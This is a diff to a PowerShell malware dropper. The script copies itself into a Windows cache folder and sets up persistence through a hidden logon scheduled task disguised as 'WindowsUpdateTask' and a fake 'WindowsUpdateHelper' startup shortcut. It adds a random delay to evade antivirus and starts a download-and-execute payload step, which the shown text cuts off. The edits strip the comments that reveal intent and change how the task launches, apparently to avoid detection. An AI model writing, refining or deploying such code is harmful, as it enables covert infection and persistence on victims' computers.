@@ -1,6 +1,5 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === SELF-PRESERVATION ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
@@ -25,15 +24,13 @@ function Save-ScriptToDisk {
 
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task (Direct PowerShell) ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 
 if (-not $taskExists) {
     try {
         $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
+        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell.exe -File `"$scriptPath`""
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
         
@@ -46,7 +43,6 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# === PERSISTENCE: Startup LNK (Direct PowerShell) ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 
@@ -61,10 +57,8 @@ if (-not (Test-Path $lnkPath)) {
     } catch {}
 }
 
-# === BEARFOOS EVASION: Delay before EXE ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
